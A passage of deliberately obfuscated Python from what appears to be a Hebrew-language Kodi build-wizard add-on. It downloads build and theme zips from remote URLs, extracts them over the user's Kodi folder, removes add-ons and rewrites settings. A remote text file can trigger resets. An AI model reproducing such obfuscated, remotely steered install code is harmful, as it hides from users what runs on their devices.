			OO000O0OO0O00O0O0 .write (OO00O0O00O0O00O0O .replace ('<import addon="xbmc.gui" version="5.12.0%s/>'%OO0OOOOO0OOO00000 ,'<import addon="xbmc.gui" version="5.14.0"/>'))#line:3884
			OO000O0OO0O00O0O0 .close ()#line:3885
		except :#line:3886
				pass #line:3887
		wiz .kodi17Fix ()#line:3888
		OO000OO000OO00OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3889
		try :#line:3890
			OO000O0OO0O00O0O0 =open (OO000OO000OO00OO0 ,'r')#line:3891
			OO00O0O00O0O00O0O =OO000O0OO0O00O0O0 .read ()#line:3892
			OO000O0OO0O00O0O0 .close ()#line:3893
			O0OOO000O0OOO0O00 ='<setting id="locale.keyboardlayouts" default="true(.+?)/setting>'#line:3894
			OO0OOOOO0OOO00000 =re .compile (O0OOO000O0OOO0O00 ).findall (OO00O0O00O0O00O0O )[0 ]#line:3895
			OO000O0OO0O00O0O0 =open (OO000OO000OO00OO0 ,'w')#line:3896
			OO000O0OO0O00O0O0 .write (OO00O0O00O0O00O0O .replace ('<setting id="locale.keyboardlayouts" default="true%s/setting>'%OO0OOOOO0OOO00000 ,'<setting id="locale.keyboardlayouts">English QWERTY|Hebrew QWERTY</setting>'))#line:3897
			OO000O0OO0O00O0O0 .close ()#line:3898
		except :#line:3899
				pass #line:3900
		swapSkins ('skin.Premium.mod')#line:3901
def buildWizard (OOOOOOO0O00O0O00O ,OOO0OOOOO000OOO0O ,theme =None ,over =False ):#line:3904
	if over ==False :#line:3905
		O000O00O0OO0OOOO0 =wiz .checkBuild (OOOOOOO0O00O0O00O ,'url')#line:3906
		OOO000OO00OOOOO0O =u_list (SPEEDFILE )#line:3907
		(OOO000OO00OOOOO0O )#line:3908
		if O000O00O0OO0OOOO0 ==False :#line:3909
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]אנא המתן...[/COLOR]'%COLOR2 )#line:3914
			xbmc .executebuiltin ("RunPlugin(plugin://plugin.program.Anonymous/?mode=install&name=+Kodi+Premium&url=gui)")#line:3915
			return #line:3916
		O00OO0OO0OOOOO0OO =wiz .workingURL (O000O00O0OO0OOOO0 )#line:3917
		if O00OO0OO0OOOOO0OO ==False :#line:3918
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Build Zip Error: %s[/COLOR]"%(COLOR2 ,O00OO0OO0OOOOO0OO ))#line:3919
			return #line:3920
	if OOO0OOOOO000OOO0O =='gui':#line:3921
		if OOOOOOO0O00O0O00O ==BUILDNAME :#line:3922
			if over ==True :O0OOO0OOOOO0OOO00 =1 #line:3923
			else :O0OOO0OOOOO0OOO00 =1 #line:3924
		else :#line:3925
			O0OOO0OOOOO0OOO00 =1 #line:3926
		if O0OOO0OOOOO0OOO00 :#line:3927
			remove_addons ()#line:3928
			remove_addons2 ()#line:3929
			debridit .debridIt ('update','all')#line:3930
			traktit .traktIt ('update','all')#line:3931
			OO0O00000OOOOO00O =wiz .checkBuild (OOOOOOO0O00O0O00O ,'gui')#line:3932
			O0OO00OOOOOOO00O0 =OOOOOOO0O00O0O00O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3933
			if not wiz .workingURL (OO0O00000OOOOO00O )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3934
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3935
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOOOOO0O00O0O00O ),'','אנא המתן')#line:3936
			O0O000OOOOOOOO00O =os .path .join (PACKAGES ,'%s_guisettings.zip'%O0OO00OOOOOOO00O0 )#line:3937
			try :os .remove (O0O000OOOOOOOO00O )#line:3938
			except :pass #line:3939
			logging .warning (OO0O00000OOOOO00O )#line:3940
			if 'google'in OO0O00000OOOOO00O :#line:3941
			   O0O0O000OOOOO0O0O =googledrive_download (OO0O00000OOOOO00O ,O0O000OOOOOOOO00O ,DP ,wiz .checkBuild (OOOOOOO0O00O0O00O ,'filesize'))#line:3942
			else :#line:3945
			  downloader .download (OO0O00000OOOOO00O ,O0O000OOOOOOOO00O ,DP )#line:3946
			xbmc .sleep (100 )#line:3947
			OOOO0O0O000OO0OO0 ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOOOOO0O00O0O00O )#line:3948
			DP .update (0 ,OOOO0O0O000OO0OO0 ,'','אנא המתן')#line:3949
			extract .all (O0O000OOOOOOOO00O ,HOME ,DP ,title =OOOO0O0O000OO0OO0 )#line:3950
			DP .close ()#line:3951
			wiz .defaultSkin ()#line:3952
			wiz .lookandFeelData ('save')#line:3953
			wiz .kodi17Fix ()#line:3954
			if KODIV >=18 :#line:3955
				skindialogsettind18 ()#line:3956
			debridit .debridIt ('restore','all')#line:3957
			traktit .traktIt ('restore','all')#line:3958
			if INSTALLMETHOD ==1 :O0OO0OOO00000O00O =1 #line:3960
			elif INSTALLMETHOD ==2 :O0OO0OOO00000O00O =0 #line:3961
			else :DP .close ()#line:3962
			OO0O0O000000OO0OO =(NOTIFICATION2 )#line:3963
			OOO0OO00OOO0O00OO =urllib2 .urlopen (OO0O0O000000OO0OO )#line:3964
			O000OOO0OOO0OO0O0 =OOO0OO00OOO0O00OO .readlines ()#line:3965
			OO00O0OOO00OOO0OO =0 #line:3966
			for OOO00OOO0O0000OO0 in O000OOO0OOO0OO0O0 :#line:3969
				if OOO00OOO0O0000OO0 .split (' ==')[0 ]=="noreset"or OOO00OOO0O0000OO0 .split ()[0 ]=="noreset":#line:3970
					xbmc .executebuiltin ("ReloadSkin()")#line:3972
					wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הבילד עודכן בהצלחה![/COLOR]'%COLOR2 )#line:3973
					update_Votes ()#line:3974
					indicatorfastupdate ()#line:3975
				if OOO00OOO0O0000OO0 .split (' ==')[0 ]=="reset"or OOO00OOO0O0000OO0 .split ()[0 ]=="reset":#line:3976
					update_Votes ()#line:3978
					indicatorfastupdate ()#line:3979
					resetkodi ()#line:3980
		else :#line:3989
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:3990
	if OOO0OOOOO000OOO0O =='gui2':#line:3991
		if OOOOOOO0O00O0O00O ==BUILDNAME :#line:3992
			if over ==True :O0OOO0OOOOO0OOO00 =1 #line:3993
			else :O0OOO0OOOOO0OOO00 =1 #line:3994
		else :#line:3995
			O0OOO0OOOOO0OOO00 =1 #line:3996
		if O0OOO0OOOOO0OOO00 :#line:3997
			remove_addons ()#line:3998
			remove_addons2 ()#line:3999
			OO0O00000OOOOO00O =wiz .checkBuild (OOOOOOO0O00O0O00O ,'gui')#line:4000
			O0OO00OOOOOOO00O0 =OOOOOOO0O00O0O00O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4001
			if not wiz .workingURL (OO0O00000OOOOO00O )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:4002
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4003
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOOOOO0O00O0O00O ),'','אנא המתן')#line:4004
			O0O000OOOOOOOO00O =os .path .join (PACKAGES ,'%s_guisettings.zip'%O0OO00OOOOOOO00O0 )#line:4005
			try :os .remove (O0O000OOOOOOOO00O )#line:4006
			except :pass #line:4007
			logging .warning (OO0O00000OOOOO00O )#line:4008
			if 'google'in OO0O00000OOOOO00O :#line:4009
			   O0O0O000OOOOO0O0O =googledrive_download (OO0O00000OOOOO00O ,O0O000OOOOOOOO00O ,DP ,wiz .checkBuild (OOOOOOO0O00O0O00O ,'filesize'))#line:4010
			else :#line:4013
			  downloader .download (OO0O00000OOOOO00O ,O0O000OOOOOOOO00O ,DP )#line:4014
			xbmc .sleep (100 )#line:4015
			OOOO0O0O000OO0OO0 ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOOOOO0O00O0O00O )#line:4016
			DP .update (0 ,OOOO0O0O000OO0OO0 ,'','אנא המתן')#line:4017
			extract .all (O0O000OOOOOOOO00O ,HOME ,DP ,title =OOOO0O0O000OO0OO0 )#line:4018
			DP .close ()#line:4019
			wiz .defaultSkin ()#line:4020
			wiz .lookandFeelData ('save')#line:4021
			if INSTALLMETHOD ==1 :O0OO0OOO00000O00O =1 #line:4024
			elif INSTALLMETHOD ==2 :O0OO0OOO00000O00O =0 #line:4025
			else :DP .close ()#line:4026
		else :#line:4028
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:4029
	elif OOO0OOOOO000OOO0O =='fresh':#line:4030
		freshStart (OOOOOOO0O00O0O00O )#line:4031
	elif OOO0OOOOO000OOO0O =='normal':#line:4032
		if url =='normal':#line:4033
			if KEEPTRAKT =='true':#line:4034
				traktit .autoUpdate ('all')#line:4035
				wiz .setS ('traktlastsave',str (THREEDAYS ))#line:4036
			if KEEPREAL =='true':#line:4037
				debridit .autoUpdate ('all')#line:4038
				wiz .setS ('debridlastsave',str (THREEDAYS ))#line:4039
			if KEEPLOGIN =='true':#line:4040
				loginit .autoUpdate ('all')#line:4041
				wiz .setS ('loginlastsave',str (THREEDAYS ))#line:4042
		O0OO0OOOOO0OOO0O0 =int (KODIV );OOO0000O0000000OO =int (float (wiz .checkBuild (OOOOOOO0O00O0O00O ,'kodi')))#line:4043
		if not O0OO0OOOOO0OOO0O0 ==OOO0000O0000000OO :#line:4044
			if O0OO0OOOOO0OOO0O0 ==16 and OOO0000O0000000OO <=15 :O000OOO0OOO0O0OO0 =False #line:4045
			else :O000OOO0OOO0O0OO0 =True #line:4046
		else :O000OOO0OOO0O0OO0 =False #line:4047
		if O000OOO0OOO0O0OO0 ==True :#line:4048
			OO00OOO0OOO00000O =1 #line:4049
		else :#line:4050
			if not over ==False :OO00OOO0OOO00000O =1 #line:4051
			else :OO00OOO0OOO00000O =DIALOG .yesno (ADDONTITLE ,'התקנה רגילה:','מצב זה שומר הרחבות קיימות, האם להמשיך?',nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4052
		if OO00OOO0OOO00000O :#line:4053
			wiz .clearS ('build')#line:4054
			OO0O00000OOOOO00O =wiz .checkBuild (OOOOOOO0O00O0O00O ,'url')#line:4055
			O0OO00OOOOOOO00O0 =OOOOOOO0O00O0O00O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4056
			if not wiz .workingURL (OO0O00000OOOOO00O )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Build Install: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:4057
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4058
			DP .create (ADDONTITLE ,'[COLOR %s][B][/B][/COLOR] [COLOR %s]%s v%s[/COLOR][B]מוריד[/B]'%(COLOR2 ,COLOR1 ,OOOOOOO0O00O0O00O ,wiz .checkBuild (OOOOOOO0O00O0O00O ,'version')),'','אנא המתן')#line:4059
			O0O000OOOOOOOO00O =os .path .join (PACKAGES ,'%s.zip'%O0OO00OOOOOOO00O0 )#line:4060
			try :os .remove (O0O000OOOOOOOO00O )#line:4061
			except :pass #line:4062
			logging .warning (OO0O00000OOOOO00O )#line:4063
			if 'google'in OO0O00000OOOOO00O :#line:4064
			   O0O0O000OOOOO0O0O =googledrive_download (OO0O00000OOOOO00O ,O0O000OOOOOOOO00O ,DP ,wiz .checkBuild (OOOOOOO0O00O0O00O ,'filesize'))#line:4065
			else :#line:4068
			  downloader .download (OO0O00000OOOOO00O ,O0O000OOOOOOOO00O ,DP )#line:4069
			xbmc .sleep (1000 )#line:4070
			OOOO0O0O000OO0OO0 ='[COLOR %s][B][/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOOOOO0O00O0O00O ,wiz .checkBuild (OOOOOOO0O00O0O00O ,'version'))#line:4071
			DP .update (0 ,OOOO0O0O000OO0OO0 ,'','אנא המתן...')#line:4072
			O0000OO0OO0OO0OOO ,OO0OOOOOO00OO00OO ,OO0OOOO0OO00OO0OO =extract .all (O0O000OOOOOOOO00O ,HOME ,DP ,title =OOOO0O0O000OO0OO0 )#line:4073
			if int (float (O0000OO0OO0OO0OOO ))>0 :#line:4074
				try :#line:4075
					wiz .fixmetas ()#line:4076
				except :pass #line:4077
				wiz .lookandFeelData ('save')#line:4078
				wiz .defaultSkin ()#line:4079
				wiz .setS ('buildname',OOOOOOO0O00O0O00O )#line:4081
				wiz .setS ('buildversion',wiz .checkBuild (OOOOOOO0O00O0O00O ,'version'))#line:4082
				wiz .setS ('buildtheme','')#line:4083
				wiz .setS ('latestversion',wiz .checkBuild (OOOOOOO0O00O0O00O ,'version'))#line:4084
				wiz .setS ('lastbuildcheck',str (NEXTCHECK ))#line:4085
				wiz .setS ('installed','true')#line:4086
				wiz .setS ('extract',str (O0000OO0OO0OO0OOO ))#line:4087
				wiz .setS ('errors',str (OO0OOOOOO00OO00OO ))#line:4088
				wiz .log ('INSTALLED %s: [ERRORS:%s]'%(O0000OO0OO0OO0OOO ,OO0OOOOOO00OO00OO ))#line:4089
				fastupdatefirstbuild (NOTEID )#line:4090
				wiz .kodi17Fix ()#line:4091
				skin_homeselect ()#line:4092
				skin_lower ()#line:4093
				rdbuildinstall ()#line:4094
				try :gaiaserenaddon ()#line:4095
				except :pass #line:4096
				adults18 ()#line:4097
				skinfix18 ()#line:4098
				try :os .remove (O0O000OOOOOOOO00O )#line:4100
				except :pass #line:4101
				O000OO0O0000OOO0O =(ADDON .getSetting ("auto_rd"))#line:4102
				if O000OO0O0000OOO0O =='true':#line:4103
					try :#line:4104
						setautorealdebrid ()#line:4105
					except :pass #line:4106
				try :#line:4107
					autotrakt ()#line:4108
				except :pass #line:4109
				OOOOO0O0O0O0O0OOO =(ADDON .getSetting ("imdb_on"))#line:4110
				if OOOOO0O0O0O0O0OOO =='true':#line:4111
					imdb_synck ()#line:4112
				iptvset ()#line:4113
				DP .close ()#line:4121
				OOO00OO0OO00O00O0 =wiz .themeCount (OOOOOOO0O00O0O00O )#line:4122
				builde_Votes ()#line:4123
				indicator ()#line:4124
				if not OOO00OO0OO00O00O0 ==False :#line:4125
					buildWizard (OOOOOOO0O00O0O00O ,'theme')#line:4126
				if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:4127
				if INSTALLMETHOD ==1 :O0OO0OOO00000O00O =1 #line:4128
				elif INSTALLMETHOD ==2 :O0OO0OOO00000O00O =0 #line:4129
				else :resetkodi ()#line:4130
				if O0OO0OOO00000O00O ==1 :wiz .reloadFix ()#line:4132
				else :wiz .killxbmc (True )#line:4133
			else :#line:4134
				if isinstance (OO0OOOOOO00OO00OO ,unicode ):#line:4135
					OO0OOOO0OO00OO0OO =OO0OOOO0OO00OO0OO .encode ('utf-8')#line:4136
				OOO0OO0OO00000OOO =open (O0O000OOOOOOOO00O ,'r')#line:4137
				OOOO0OO00O00O0O00 =OOO0OO0OO00000OOO .read ()#line:4138
				O0OO00000OOO0O00O =''#line:4139
				for O00O000000O00OOOO in O0O0O000OOOOO0O0O :#line:4140
				  O0OO00000OOO0O00O ='key: '+O0OO00000OOO0O00O +'\n'+O00O000000O00OOOO #line:4141
				wiz .TextBox ("%s: בעיה בהתקנת הבילד"%ADDONTITLE ,OO0OOOO0OO00OO0OO +'לפתרון הבעיה יש לשנות את התאריך במכשיר ליום אחד קודם.'+O0OO00000OOO0O00O )#line:4142
		else :#line:4143
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנת הבילד: מבוטלת![/COLOR]'%COLOR2 )#line:4144
	elif OOO0OOOOO000OOO0O =='theme':#line:4145
		if theme ==None :#line:4146
			OOO00OO0OO00O00O0 =wiz .checkBuild (OOOOOOO0O00O0O00O ,'theme')#line:4147
			OOO00O00OO000OO0O =[]#line:4148
			if not OOO00OO0OO00O00O0 =='http://'and wiz .workingURL (OOO00OO0OO00O00O0 )==True :#line:4149
				OOO00O00OO000OO0O =wiz .themeCount (OOOOOOO0O00O0O00O ,False )#line:4150
				if len (OOO00O00OO000OO0O )>0 :#line:4151
					if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]The Build [COLOR %s]%s[/COLOR] comes with [COLOR %s]%s[/COLOR] different themes"%(COLOR2 ,COLOR1 ,OOOOOOO0O00O0O00O ,COLOR1 ,len (OOO00O00OO000OO0O )),"Would you like to install one now?[/COLOR]",yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]"):#line:4152
						wiz .log ("Theme List: %s "%str (OOO00O00OO000OO0O ))#line:4153
						O000OO00O0O00O00O =DIALOG .select (ADDONTITLE ,OOO00O00OO000OO0O )#line:4154
						wiz .log ("Theme install selected: %s"%O000OO00O0O00O00O )#line:4155
						if not O000OO00O0O00O00O ==-1 :theme =OOO00O00OO000OO0O [O000OO00O0O00O00O ];O0O0O000O00OOOO0O =True #line:4156
						else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:4157
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:4158
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: None Found![/COLOR]'%COLOR2 )#line:4159
		else :O0O0O000O00OOOO0O =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to install the theme:'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,theme ),'for [COLOR %s]%s v%s[/COLOR]?[/COLOR]'%(COLOR1 ,OOOOOOO0O00O0O00O ,wiz .checkBuild (OOOOOOO0O00O0O00O ,'version')),yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]")#line:4160
		if O0O0O000O00OOOO0O :#line:4161
			OOO0O0OO0O00OOOO0 =wiz .checkTheme (OOOOOOO0O00O0O00O ,theme ,'url')#line:4162
			O0OO00OOOOOOO00O0 =OOOOOOO0O00O0O00O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4163
			if not wiz .workingURL (OOO0O0OO0O00OOOO0 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Invalid Zip Url![/COLOR]'%COLOR2 );return False #line:4164
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4165
			DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme ),'','Please Wait')#line:4166
			O0O000OOOOOOOO00O =os .path .join (PACKAGES ,'%s.zip'%O0OO00OOOOOOO00O0 )#line:4167
			try :os .remove (O0O000OOOOOOOO00O )#line:4168
			except :pass #line:4169
			downloader .download (OOO0O0OO0O00OOOO0 ,O0O000OOOOOOOO00O ,DP )#line:4170
			xbmc .sleep (1000 )#line:4171
			DP .update (0 ,"","Installing %s "%OOOOOOO0O00O0O00O )#line:4172
			OO00O0OO0000O000O =False #line:4173
			if url not in ["fresh","normal"]:#line:4174
				OO00O0OO0000O000O =testTheme (O0O000OOOOOOOO00O )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:4175
				OO0O00O00O00O00OO =testGui (O0O000OOOOOOOO00O )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:4176
				if OO00O0OO0000O000O ==True :#line:4177
					wiz .lookandFeelData ('save')#line:4178
					OO00O00OOOOOO00OO ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:4179
					OOO000OO0OOOO0OOO =xbmc .getSkinDir ()#line:4180
					skinSwitch .swapSkins (OO00O00OOOOOO00OO )#line:4182
					O000OOO0OOO0OO0O0 =0 #line:4183
					xbmc .sleep (1000 )#line:4184
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O000OOO0OOO0OO0O0 <150 :#line:4185
						O000OOO0OOO0OO0O0 +=1 #line:4186
						xbmc .sleep (1000 )#line:4187
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4188
						wiz .ebi ('SendClick(11)')#line:4189
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:4190
					xbmc .sleep (1000 )#line:4191
			OOOO0O0O000OO0OO0 ='[COLOR %s][B]Installing Theme:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme )#line:4192
			DP .update (0 ,OOOO0O0O000OO0OO0 ,'','אנא המתן')#line:4193
			O0000OO0OO0OO0OOO ,OO0OOOOOO00OO00OO ,OO0OOOO0OO00OO0OO =extract .all (O0O000OOOOOOOO00O ,HOME ,DP ,title =OOOO0O0O000OO0OO0 )#line:4194
			wiz .setS ('buildtheme',theme )#line:4195
			wiz .log ('INSTALLED %s: [שגיאות:%s]'%(O0000OO0OO0OO0OOO ,OO0OOOOOO00OO00OO ))#line:4196
			DP .close ()#line:4197
			if url not in ["fresh","normal"]:#line:4198
				wiz .forceUpdate ()#line:4199
				if KODIV >=17 :wiz .kodi17Fix ()#line:4200
				if OO0O00O00O00O00OO ==True :#line:4201
					wiz .lookandFeelData ('save')#line:4202
					wiz .defaultSkin ()#line:4203
					OOO000OO0OOOO0OOO =wiz .getS ('defaultskin')#line:4204
					skinSwitch .swapSkins (OOO000OO0OOOO0OOO )#line:4205
					O000OOO0OOO0OO0O0 =0 #line:4206
					xbmc .sleep (1000 )#line:4207
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O000OOO0OOO0OO0O0 <150 :#line:4208
						O000OOO0OOO0OO0O0 +=1 #line:4209
						xbmc .sleep (1000 )#line:4210
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4212
						wiz .ebi ('SendClick(11)')#line:4213
					wiz .lookandFeelData ('restore')#line:4214
				elif OO00O0OO0000O000O ==True :#line:4215
					skinSwitch .swapSkins (OOO000OO0OOOO0OOO )#line:4216
					O000OOO0OOO0OO0O0 =0 #line:4217
					xbmc .sleep (1000 )#line:4218
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O000OOO0OOO0OO0O0 <150 :#line:4219
						O000OOO0OOO0OO0O0 +=1 #line:4220
						xbmc .sleep (1000 )#line:4221
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4223
						wiz .ebi ('SendClick(11)')#line:4224
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:4225
					wiz .lookandFeelData ('restore')#line:4226
				else :#line:4227
					wiz .ebi ("ReloadSkin()")#line:4228
					xbmc .sleep (1000 )#line:4229
					wiz .ebi ("Container.Refresh")#line:4230
		else :#line:4231
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 )#line:4232
def skin_homeselect ():#line:4236
	try :#line:4238
		OOOOOOOO000OO0OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4239
		O00O0O00OOOOOOOOO =open (OOOOOOOO000OO0OO0 ,'r')#line:4241
		O00OOOOO00O000O00 =O00O0O00OOOOOOOOO .read ()#line:4242
		O00O0O00OOOOOOOOO .close ()#line:4243
		O0O0OOO0OOO00000O ='<setting id="HomeS" type="string(.+?)/setting>'#line:4244
		OOO0O000OOO0OOO0O =re .compile (O0O0OOO0OOO00000O ).findall (O00OOOOO00O000O00 )[0 ]#line:4245
		O00O0O00OOOOOOOOO =open (OOOOOOOO000OO0OO0 ,'w')#line:4246
		O00O0O00OOOOOOOOO .write (O00OOOOO00O000O00 .replace ('<setting id="HomeS" type="string%s/setting>'%OOO0O000OOO0OOO0O ,'<setting id="HomeS" type="string"></setting>'))#line:4247
		O00O0O00OOOOOOOOO .close ()#line:4248
	except :#line:4249
		pass #line:4250
def skin_lower ():#line:4253
	OOOO00O0000O00OO0 =(ADDON .getSetting ("lower"))#line:4254
	if OOOO00O0000O00OO0 =='true':#line:4255
		try :#line:4258
			O0O0OOOO0OO0OO0O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4259
			O0O0O00O0OOOOO000 =open (O0O0OOOO0OO0OO0O0 ,'r')#line:4261
			O00OO0O0OOO0OO0O0 =O0O0O00O0OOOOO000 .read ()#line:4262
			O0O0O00O0OOOOO000 .close ()#line:4263
			O00O0O0OO0OO0O00O ='<setting id="none_widget" type="bool(.+?)/setting>'#line:4264
			OOOO000OOOO00OO00 =re .compile (O00O0O0OO0OO0O00O ).findall (O00OO0O0OOO0OO0O0 )[0 ]#line:4265
			O0O0O00O0OOOOO000 =open (O0O0OOOO0OO0OO0O0 ,'w')#line:4266
			O0O0O00O0OOOOO000 .write (O00OO0O0OOO0OO0O0 .replace ('<setting id="none_widget" type="bool%s/setting>'%OOOO000OOOO00OO00 ,'<setting id="none_widget" type="bool">true</setting>'))#line:4267
			O0O0O00O0OOOOO000 .close ()#line:4268
			O0O0OOOO0OO0OO0O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4270
			O0O0O00O0OOOOO000 =open (O0O0OOOO0OO0OO0O0 ,'r')#line:4272
			O00OO0O0OOO0OO0O0 =O0O0O00O0OOOOO000 .read ()#line:4273
			O0O0O00O0OOOOO000 .close ()#line:4274
			O00O0O0OO0OO0O00O ='<setting id="DisableOverlayColor" type="bool(.+?)/setting>'#line:4275
			OOOO000OOOO00OO00 =re .compile (O00O0O0OO0OO0O00O ).findall (O00OO0O0OOO0OO0O0 )[0 ]#line:4276
			O0O0O00O0OOOOO000 =open (O0O0OOOO0OO0OO0O0 ,'w')#line:4277
			O0O0O00O0OOOOO000 .write (O00OO0O0OOO0OO0O0 .replace ('<setting id="DisableOverlayColor" type="bool%s/setting>'%OOOO000OOOO00OO00 ,'<setting id="DisableOverlayColor" type="bool">true</setting>'))#line:4278
			O0O0O00O0OOOOO000 .close ()#line:4279
			O0O0OOOO0OO0OO0O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4281
			O0O0O00O0OOOOO000 =open (O0O0OOOO0OO0OO0O0 ,'r')#line:4283
			O00OO0O0OOO0OO0O0 =O0O0O00O0OOOOO000 .read ()#line:4284
			O0O0O00O0OOOOO000 .close ()#line:4285
			O00O0O0OO0OO0O00O ='<setting id="backgroundwallpaper" type="bool(.+?)/setting>'#line:4286
			OOOO000OOOO00OO00 =re .compile (O00O0O0OO0OO0O00O ).findall (O00OO0O0OOO0OO0O0 )[0 ]#line:4287
			O0O0O00O0OOOOO000 =open (O0O0OOOO0OO0OO0O0 ,'w')#line:4288
			O0O0O00O0OOOOO000 .write (O00OO0O0OOO0OO0O0 .replace ('<setting id="backgroundwallpaper" type="bool%s/setting>'%OOOO000OOOO00OO00 ,'<setting id="backgroundwallpaper" type="bool">true</setting>'))#line:4289
			O0O0O00O0OOOOO000 .close ()#line:4290
			O0O0OOOO0OO0OO0O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4294
			O0O0O00O0OOOOO000 =open (O0O0OOOO0OO0OO0O0 ,'r')#line:4296
			O00OO0O0OOO0OO0O0 =O0O0O00O0OOOOO000 .read ()#line:4297
			O0O0O00O0OOOOO000 .close ()#line:4298
			O00O0O0OO0OO0O00O ='<setting id="show.clearlogo" type="bool(.+?)/setting>'#line:4299
